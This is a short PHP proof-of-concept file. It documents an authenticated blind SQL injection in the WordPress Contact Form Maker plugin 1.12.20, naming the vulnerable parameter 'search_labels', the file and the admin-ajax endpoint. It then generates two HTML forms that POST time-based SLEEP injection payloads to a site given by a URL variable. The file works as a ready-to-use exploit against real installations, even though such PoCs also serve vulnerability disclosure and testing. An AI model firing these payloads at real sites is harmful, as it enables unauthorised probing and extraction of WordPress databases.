<?php   echo "<h3>WordPress Contact Form Maker Plugin 1.12.20 - BLIND SQL Injection Vulnerability <span style=\"color:red;\">(auth needed)</span></h3>";
  echo "<!-- <p>3.2 SQL injection</p>";
  echo "<p>Vulnerable Function:  get_col()</p>";
  echo "<p>Vulnerable Variable:  _REQUEST['search_labels']</p>";
  echo "<p>Vulnerable URL:</p>";
  echo "<p>http://".$url."/wp-admin/admin-ajax.php?form_id=1&send_header=0&action=generete_csv_fmc&limitstart=0</p>";
  echo "<p>File:                 contact-form-maker/framework/WDW_FM_Library.php</p>";
  echo "<p>Proof of Concept: See Appendix #2</p> -->";

  echo "# PoC 1";

  echo "<form class=\"wp-form\" id=\"form\" method=\"POST\" action=\"http://".$url."/wp-admin/admin-ajax.php?action=FormMakerSQLMapping_fmc&task=db_table_struct\"";
  echo "target=\"invisible\">&nbsp;";
  echo " <p>name  <input type=\"text\" size=\"50\" name=\"name\" value=\"wp_users WHERE 42=42 AND SLEEP(42)--;\"/></p>";
  echo "<input type=\"submit\" value=\"Submit request\" />";
  echo "</form><br>";

  echo "# PoC 2";

  echo "<form class=\"wp-form\" id=\"form\" method=\"POST\" action=\"http://".$url."/wp-admin/admin-ajax.php?form_id=1&send_header=0&action=generete_csv_fmc&limitstart=0\"";
  echo "target=\"invisible\">&nbsp;";
  echo " <p>search_labels  <input type=\"text\" size=\"50\" name=\"search_labels\" value=\"(SELECT * FROM (SELECT(SLEEP(5)))XXX)\"/></p>";
  echo "<input type=\"submit\" value=\"Submit request\" />";
  echo "</form>";
 ?>
